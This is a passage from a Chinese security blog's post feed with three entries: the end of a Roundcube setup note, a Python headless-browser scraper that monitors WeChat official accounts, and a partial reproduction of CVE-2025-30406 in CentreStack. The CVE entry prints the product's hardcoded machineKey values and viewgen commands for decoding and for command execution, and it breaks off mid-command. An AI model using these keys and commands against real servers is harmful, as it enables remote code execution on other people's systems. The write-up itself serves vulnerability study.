apache"><span class="hljs-attribute">docker</span> run <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e ROUNDCUBEMAIL_DEFAULT_HOST=ssl://imap.qq.com <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e ROUNDCUBEMAIL_DEFAULT_PORT=<span class="hljs-number">993</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e ROUNDCUBEMAIL_SMTP_SERVER=tls://imap.qq.com <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e ROUNDCUBEMAIL_SMTP_PORT=<span class="hljs-number">587</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -p <span class="hljs-number">8000</span>:<span class="hljs-number">80</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -d roundcube/roundcubemail:<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">10</span>-apache<br></code></pre></td></tr></table></figure><p>这里使用的是 QQ 邮箱，登录的时候需要通过授权吗登录。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信公众号定时监控</title>
      <link href="/2025/06/01/%E5%BC%80%E5%8F%91/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%AE%9A%E6%97%B6%E7%9B%91%E6%8E%A7/"/>
      <url>/2025/06/01/%E5%BC%80%E5%8F%91/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%AE%9A%E6%97%B6%E7%9B%91%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<p>因为想着定时监控一些安全类的公众号的最新发布，所以网上找了找爬公众号的方法，不过都不太符合，所以就使用无头浏览器实现了一下。</p><p>一些获取公众号文章的方法：</p><ul><li>Hook Windows 微信</li><li>基于微信读书</li><li>基于搜狗</li><li>第三方平台</li><li>基于微信公众号平台</li></ul><p>这里主要是基于微信公众号平台实现，大概就 4 ~ 5 天需要登录一次，还可以接受。</p><p>实现思路：</p><ol><li>访问 mp.weixin.qq.com 判断登录状态</li><li>如果没有登录，则抓取登录二维码，转换为可以在终端展示的格式输出（ 因为要在服务器上面跑，所以要输出，大小就是那么大，没找到控制的办法 ）</li><li>成功登录后就是模拟点击图文的页面，然后模拟输入微信公众号获取标题和链接</li><li>监控去重是根据链接，第一次的时候会把链接 hash 存储到文件中，然后后续就是基于这个文件去判断是否有新增</li></ol><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608131043544.png?imageSlim" alt="image-20250608131043544"></p><p>代码中包含项目的其他库，如果需要使用的话摘出来爬虫的就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> warnings<br><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">import</span> mmh3<br><br><span class="hljs-keyword">from</span> scripts.utils.save <span class="hljs-keyword">import</span> save_weixin_md<br><span class="hljs-keyword">from</span> scripts.utils.ding <span class="hljs-keyword">import</span> send_ding_msg, dict_format_md<br><span class="hljs-keyword">from</span> scripts.utils.init <span class="hljs-keyword">import</span> init_config<br><span class="hljs-keyword">from</span> scripts.utils.logger <span class="hljs-keyword">import</span> init_logger<br><span class="hljs-keyword">from</span> scripts.utils.<span class="hljs-built_in">hash</span> <span class="hljs-keyword">import</span> get_hashes, init_hashes, add_hash<br><br><span class="hljs-keyword">from</span> webdriver_manager.chrome <span class="hljs-keyword">import</span> ChromeDriverManager<br><span class="hljs-keyword">import</span> undetected_chromedriver <span class="hljs-keyword">as</span> uc<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> Keys<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><span class="hljs-keyword">import</span> pyqrcode<br><span class="hljs-keyword">from</span> pyzbar.pyzbar <span class="hljs-keyword">import</span> decode<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> datetime<br><br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>, category=ResourceWarning)<br><br>config = init_config(<span class="hljs-string">&#x27;config/config.yaml&#x27;</span>)<br>logger = init_logger(config[<span class="hljs-string">&#x27;logger&#x27;</span>])<br>targets = config[<span class="hljs-string">&#x27;weixin&#x27;</span>][<span class="hljs-string">&#x27;targets&#x27;</span>]<br>driver_executable_path = ChromeDriverManager().install()<br>token = <span class="hljs-string">&#x27;&#x27;</span><br><br>ding_secret = config[<span class="hljs-string">&#x27;ding_web_hook&#x27;</span>][<span class="hljs-string">&#x27;secret&#x27;</span>]<br>ding_token = config[<span class="hljs-string">&#x27;ding_web_hook&#x27;</span>][<span class="hljs-string">&#x27;token&#x27;</span>]<br>hexo_path = config[<span class="hljs-string">&#x27;hexo_path&#x27;</span>]<br>hexo_post_path = os.path.join(hexo_path, <span class="hljs-string">&#x27;source/_posts&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_browser</span>():<br>    options = uc.ChromeOptions()<br>    options.add_argument(<span class="hljs-string">&quot;--user-data-dir=./data/chrome-profile&quot;</span>)   <span class="hljs-comment"># windows 下会卡住</span><br>    options.add_argument(<span class="hljs-string">&quot;--no-sandbox&quot;</span>)<br>    options.add_argument(<span class="hljs-string">&quot;--headless=new&quot;</span>)<br>    options.add_argument(<span class="hljs-string">&quot;--disable-dev-shm-usage&quot;</span>)<br>    options.add_argument(<span class="hljs-string">&quot;--disable-blink-features=AutomationControlled&quot;</span>)<br>    <span class="hljs-keyword">return</span> uc.Chrome(options=options, headless=<span class="hljs-literal">True</span>, driver_executable_path=driver_executable_path)<br>    <span class="hljs-comment"># return uc.Chrome(options=options, headless=False, driver_executable_path=driver_executable_path)  # windows 下适用</span><br><br><br>browser = create_browser()<br>logger.info(<span class="hljs-string">&#x27;浏览器启动成功&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reget_targets</span>():<br>    <span class="hljs-keyword">global</span> config<br>    <span class="hljs-keyword">global</span> targets<br>    config = init_config(<span class="hljs-string">&#x27;config/config.yaml&#x27;</span>)<br>    targets = config[<span class="hljs-string">&#x27;weixin&#x27;</span>][<span class="hljs-string">&#x27;targets&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_qrcode</span>():<br>    browser.get(<span class="hljs-string">&quot;https://mp.weixin.qq.com/&quot;</span>)<br>    time.sleep(<span class="hljs-number">5</span>)<br>    qr_img = browser.find_element(By.CSS_SELECTOR, <span class="hljs-string">&quot;img.login__type__container__scan__qrcode&quot;</span>)<br>    qrcode_file = <span class="hljs-string">&#x27;data/qr_only.png&#x27;</span><br>    qr_img.screenshot(qrcode_file)<br>    img = Image.<span class="hljs-built_in">open</span>(qrcode_file)<br>    decoded_objects = decode(img)<br>    qr_content = decoded_objects[<span class="hljs-number">0</span>].data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    qr_url = pyqrcode.create(qr_content, error=<span class="hljs-string">&#x27;L&#x27;</span>)<br>    qr_text = qr_url.terminal(module_color=<span class="hljs-string">&#x27;black&#x27;</span>, background=<span class="hljs-string">&#x27;white&#x27;</span>, quiet_zone=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> qr_text<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_login_status</span>():<br>    <span class="hljs-keyword">global</span> token<br>    logger.info(<span class="hljs-string">&#x27;正在检测当前登录状态 ...&#x27;</span>)<br>    browser.get(<span class="hljs-string">&quot;https://mp.weixin.qq.com/&quot;</span>)<br>    time.sleep(<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/cgi-bin/home?t=home/index&amp;lang=zh_CN&amp;token=&#x27;</span> <span class="hljs-keyword">in</span> browser.current_url:<br>        token = browser.current_url.split(<span class="hljs-string">&#x27;token=&#x27;</span>)[<span class="hljs-number">1</span>]<br>        logger.info(<span class="hljs-string">&#x27;检测到已经登录, token=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(token))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> token:<br>        send_ding_msg(<br>            title=<span class="hljs-string">&quot;微信公众号登录&quot;</span>,<br>            content=<span class="hljs-string">&quot;请重新扫码登录&quot;</span>,<br>            access_token=ding_token,<br>            secret=ding_secret,<br>        )<br>    logger.info(<span class="hljs-string">&#x27;检测到未登录或已失效&#x27;</span>)<br>    value = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入 Y 获取二维码进行登录或者 N 退出: &quot;</span>)<br>    <span class="hljs-keyword">if</span> value == <span class="hljs-string">&#x27;Y&#x27;</span>:<br>        logger.info(<span class="hljs-string">&#x27;请在 1 分钟内登录: &#x27;</span>)<br>        <span class="hljs-built_in">print</span>(get_qrcode())<br>        time.sleep(<span class="hljs-number">60</span>)<br>        <span class="hljs-keyword">return</span> check_login_status()<br>    <span class="hljs-keyword">if</span> value == <span class="hljs-string">&#x27;N&#x27;</span>:<br>        logger.info(<span class="hljs-string">&#x27;bye bye !&#x27;</span>)<br>        exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_articles</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取公众号最新 4 篇文章</span><br><span class="hljs-string">    :param name:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    posts = []<br>    logger.info(<span class="hljs-string">&#x27;开始获取 &#123;&#125; 的最新文章 ...&#x27;</span>.<span class="hljs-built_in">format</span>(name))<br>    href = <span class="hljs-string">&#x27;https://mp.weixin.qq.com/cgi-bin/appmsg?t=media/appmsg_edit_v2&amp;action=edit&amp;isNew=1&amp;type=10&amp;token=&#123;&#125;&amp;lang=zh_CN&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        token)<br>    browser.get(href)<br>    logger.info(<span class="hljs-string">&quot;已打开图文消息页面&quot;</span>)<br>    time.sleep(<span class="hljs-number">5</span>)<br>    link_element = browser.find_element(By.CSS_SELECTOR, <span class="hljs-string">&quot;li#js_editor_insertlink&quot;</span>)<br>    link_element.click()<br>    logger.info(<span class="hljs-string">&quot;已点击超链接&quot;</span>)<br>    time.sleep(<span class="hljs-number">3</span>)<br>    other_account_button = browser.find_element(By.CSS_SELECTOR,<br>                                                <span class="hljs-string">&quot;div.weui-desktop-btn_wrp.weui-desktop-link-btn.weui-desktop-link &gt; button.weui-desktop-btn.weui-desktop-btn_default&quot;</span>)<br>    other_account_button.click()<br>    logger.info(<span class="hljs-string">&quot;已点击&#x27;选择其他账号&#x27;按钮&quot;</span>)<br>    time.sleep(<span class="hljs-number">5</span>)<br><br>    input_element = browser.find_element(By.CSS_SELECTOR,<br>                                         <span class="hljs-string">&quot;input.weui-desktop-form__input[placeholder=&#x27;输入文章来源的账号名称或微信号，回车进行搜索&#x27;]&quot;</span>)<br>    input_element.send_keys(name)<br>    input_element.send_keys(Keys.RETURN)<br>    time.sleep(<span class="hljs-number">5</span>)<br><br>    first_result = browser.find_element(By.CSS_SELECTOR,<br>                                        <span class="hljs-string">&quot;ul.inner_link_account_list &gt; li.inner_link_account_item:first-child&quot;</span>)<br>    logger.info(<span class="hljs-string">&#x27;选择公众号: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(first_result.text))<br>    first_result.click()<br>    time.sleep(<span class="hljs-number">5</span>)<br><br>    articles = browser.find_elements(By.CSS_SELECTOR, <span class="hljs-string">&quot;label.inner_link_article_item&quot;</span>)<br>    <span class="hljs-keyword">for</span> article <span class="hljs-keyword">in</span> articles:<br>        title = article.find_element(By.CSS_SELECTOR, <span class="hljs-string">&quot;div.inner_link_article_title&quot;</span>).text<br>        date = article.find_element(By.CSS_SELECTOR, <span class="hljs-string">&quot;div.inner_link_article_date &gt; span:nth-child(1)&quot;</span>).text<br>        link = article.find_element(By.CSS_SELECTOR,<br>                                    <span class="hljs-string">&quot;div.inner_link_article_date &gt; span.weui-desktop-vm_default &gt; a&quot;</span>).get_attribute(<br>            <span class="hljs-string">&quot;href&quot;</span>)<br>        logger.info(title)<br>        posts.append(&#123;<br>            <span class="hljs-string">&#x27;title&#x27;</span>: title,<br>            <span class="hljs-string">&quot;name&quot;</span>: name,<br>            <span class="hljs-string">&#x27;link&#x27;</span>: link,<br>            <span class="hljs-string">&#x27;mmh3_hash&#x27;</span>: <span class="hljs-built_in">str</span>(mmh3.<span class="hljs-built_in">hash</span>(link, signed=<span class="hljs-literal">False</span>))<br>        &#125;)<br>    <span class="hljs-keyword">return</span> posts<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restart_browser</span>():<br>    <span class="hljs-keyword">global</span> browser<br>    logger.info(<span class="hljs-string">&#x27;开始重启浏览器 ...&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        browser.quit()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.error(e)<br>    <span class="hljs-keyword">finally</span>:<br>        browser = create_browser()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    未知原因会出现 [ERROR] HTTPConnectionPool(host=&#x27;localhost&#x27;, port=36541): Read timed out. (read timeout=120)</span><br><span class="hljs-string">    如果出现就关闭浏览器重启</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    check_login_status()<br>    reget_targets()<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> target <span class="hljs-keyword">in</span> targets:<br>        posts = get_articles(target)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> posts:<br>            <span class="hljs-keyword">continue</span><br>        hash_file = <span class="hljs-string">&#x27;data/weixin_&#123;&#125;_hash.txt&#x27;</span>.<span class="hljs-built_in">format</span>(target)<br>        hashes = get_hashes(hash_file)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> hashes:<br>            logger.info(<span class="hljs-string">&#x27;未检测到 hashes 进行初始化&#x27;</span>)<br>            init_hashes(posts, hash_file)<br>            logger.info(<span class="hljs-string">&#x27;初始化成功, 本地检索结束 !&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> post <span class="hljs-keyword">in</span> posts:<br>            mmh3_hash = post[<span class="hljs-string">&#x27;mmh3_hash&#x27;</span>]<br>            <span class="hljs-keyword">if</span> mmh3_hash <span class="hljs-keyword">in</span> hashes:<br>                <span class="hljs-keyword">continue</span><br>            logger.info(<span class="hljs-string">&#x27;发现新增文章: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(post[<span class="hljs-string">&#x27;title&#x27;</span>]))<br>            count += <span class="hljs-number">1</span><br>            add_hash(mmh3_hash, hash_file)<br>            save_weixin_md(hexo_post_path, post)<br>            send_ding_msg(<br>                title=<span class="hljs-string">&quot;微信公众号更新&quot;</span>,<br>                content=dict_format_md(post),<br>                access_token=ding_token,<br>                secret=ding_secret,<br>            )<br>    <span class="hljs-keyword">if</span> count:<br>        <span class="hljs-keyword">from</span> hexo_puhish <span class="hljs-keyword">import</span> hexo_puhish<br>        hexo_puhish()<br><br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        run()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.error(e)<br>        restart_browser()<br>        <span class="hljs-keyword">continue</span><br>    now = datetime.datetime.utcnow()<br>    next_time = now + datetime.timedelta(hours=<span class="hljs-number">1</span>)<br>    logger.info(<span class="hljs-string">&#x27;本次任务执行成功, 下次任务执行时间: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(next_time.isoformat()))<br>    time.sleep(<span class="hljs-number">30</span> * <span class="hljs-number">60</span>)<br><br></code></pre></td></tr></table></figure><p>启动后就是这样，扫码登录即可，可以在 Linux 下运行，安装一下 chrom 就行。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608130435403.png?imageSlim" alt="image-20250608130435403"></p><p>服务器上运行日志：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608131146855.png?imageSlim" alt="image-20250608131146855"></p><p>推送主要是钉钉和推送到 Gtihub Page Hexo 博客上面：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250608131343196.png?imageSlim" alt="image-20250608131343196"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-30406 CentreStack ViewState 反序列化漏洞分析</title>
      <link href="/2025/05/18/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2025-30406/"/>
      <url>/2025/05/18/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2025-30406/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：CVE-2025-30406 CentreStack ViewState 反序列化漏洞</p><p>漏洞原理：CentreStack 存在硬编码的 machineKey, 导致 ViewState 反序列化漏洞。</p><p>影响产品：Gladinet CentreStack 和 Triofox</p><p>产品介绍：CentreStack 是 Gladinet 的主要移动访问和安全共享解决方案。来自包括美国、加拿大、英国、澳大利亚、荷兰、瑞士等49个国家的数千家企业使用CentreStack。通过CentreStack，这些企业解决了数据所有权、数据隐私和数据安全问题，同时为其员工引入了一个安全的文件共享解决方案。</p><p>搜索语法：response:”&#x2F;portal&#x2F;loginpage.aspx” AND response:”__VIEWSTATEGENERATOR”</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载：<a href="https://www.centrestack.com/p/gce_latest_release.html">https://www.centrestack.com/p/gce_latest_release.html</a></p><p>版本：16.1.10296.56315</p><p>windows server exe 安装即可</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image1-17493518559951.png?imageSlim" alt="图片"></p><h2 id="ViewState-反序列化"><a href="#ViewState-反序列化" class="headerlink" title="ViewState 反序列化"></a>ViewState 反序列化</h2><h3 id="ViewState-介绍"><a href="#ViewState-介绍" class="headerlink" title="ViewState 介绍"></a>ViewState 介绍</h3><p><strong>ViewState</strong> 是 ASP.NET WebForms 中用于<strong>在客户端保存控件状态</strong>的一种机制。它允许在页面回发（PostBack）时，服务器可以重新还原控件的上一次状态，而不需要重新初始化所有数据。</p><p>它一般是以 Base64 编码的形式存储在 HTML 中，例如：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image2.png?imageSlim" alt="图片"></p><h3 id="ViewState-生成恢复过程"><a href="#ViewState-生成恢复过程" class="headerlink" title="ViewState 生成恢复过程"></a>ViewState 生成恢复过程</h3><p>生成过程：控件树 -&gt; SaveViewState -&gt; 序列化 -&gt; (加密) -&gt; （签名） -&gt; Base64 -&gt; HTML输出</p><ol><li><p>控件树生成：用户访问 <code>.aspx</code> 页面时，ASP.NET 解析页面，构建控件树（Page + 各种 Server 控件），控件持有属性状态（如 Text、Value、Checked）。 </p></li><li><p>保存控件状态：每个控件调用 <code>SaveViewState()</code>，将自己的状态保存到（可选）（轻量数据结构）。 </p></li><li><p>对象树序列化：使用 <code>LosFormatter</code> 或 <code>ObjectStateFormatter</code>，将对象树序列化成字节流。 </p></li><li><p>加密（可选）：如果启用，使用 AES 加密字节流，密钥来自 <code>web.config</code> 中的 machineKey（decryptionKey）。 </p></li><li><p>签名（可选）：用 HMACSHA1 或 HMACSHA256，结合 validationKey，对数据进行签名，防篡改。 </p></li><li><p>Base64 编码输出：最后将字节流Base64编码，嵌入页面的 <code>&lt;input type=&quot;hidden&quot; id=&quot;__VIEWSTATE&quot; /&gt;</code>。</p></li></ol><p>将 ViewState 恢复到控件的过程：接收 HTML -&gt; Base64解码 -&gt; （验证签名） -&gt; (解密) -&gt; 反序列化 -&gt; LoadViewState</p><h3 id="ViewState-反序列化-1"><a href="#ViewState-反序列化-1" class="headerlink" title="ViewState 反序列化"></a>ViewState 反序列化</h3><p>从上面恢复的过程可以看出，一旦泄露了加密和签名所使用的算法和密钥，我们就可以构造恶意的 ViewState 实现反序列化攻击。</p><p>加密和签名序列化数据所用的算法和密钥存放在 web.config  。该漏洞就是由于 web.config 中配置的算法和密钥是固定的，我们可以本地搭建环境获取其密钥然后构造反序列化 Payload。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境搭建完毕可以在 “C:\Program Files (x86)\Gladinet Cloud Enterprise\root\web.config” 中可以找到 ViewState 密钥。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image3.png?imageSlim" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">decryption=&quot;AES&quot; <br>decryptionKey=&quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; <br>validationKey=&quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot;<br></code></pre></td></tr></table></figure><p>随后可以使用 viewgen 工具进行验证：<br>获取登陆页面中的 __VIEWSTATE 和 __VIEWSTATEGENERATOR：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image4.png?imageSlim" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">docker run 0xacb/viewgen --decode --check --modifier 3FE2630A &quot;/wEPDwUJLTc5MTM0MzY1DxYCHhNDU1JGVG9rZW4xNTk5MTIwOTM2BSRmN2JkYTAwMC01YjNlLTQ2MWMtODUyYy04MDhlOWM5YWI4YzQWAmYPZBYCAgEPZBYCAgEPZBYEAgQPZBYIZg8PFgIeCEltYWdlVXJsBRVpbWFnZXMvdGVhbWNsb3VkMi5qcGdkZAIBDw8WAh8BBRhpbWFnZXMvY2VudHJlc3RhY2tfbC5wbmdkZAICD2QWBgICDw8WAh4HVG9vbFRpcAUJVXNlciBOYW1lFgIeC3BsYWNlaG9sZGVyBQlVc2VyIE5hbWVkAgYPZBYCAgEPDxYCHwIFCFBhc3N3b3JkFgIfAwUIUGFzc3dvcmRkAgoPDxYEHgtOYXZpZ2F0ZVVybAUPR0Nsb3VkUGxhbi5hc3B4HgdWaXNpYmxlaGRkAgsPDxYCHgRUZXh0ZGRkAgoPDxYCHwYFC0NlbnRyZVN0YWNrZGRkMTmsZSWav/7DTVPhcB8+QA8OWceS26J2YazzfcBTmT8=&quot; --vkey &quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --valg SHA256 --dkey &quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --dalg &quot;AES&quot; <br></code></pre></td></tr></table></figure><p>可以成功解码：<br><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image5.png?imageSlim" alt="图片"><br>命令执行测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">docker run 0xacb/viewgen --command &quot;cmd /c ipconfig &gt; C:\Windows\Temp\ipconfig.txt&quot; --modifier 3FE2630A 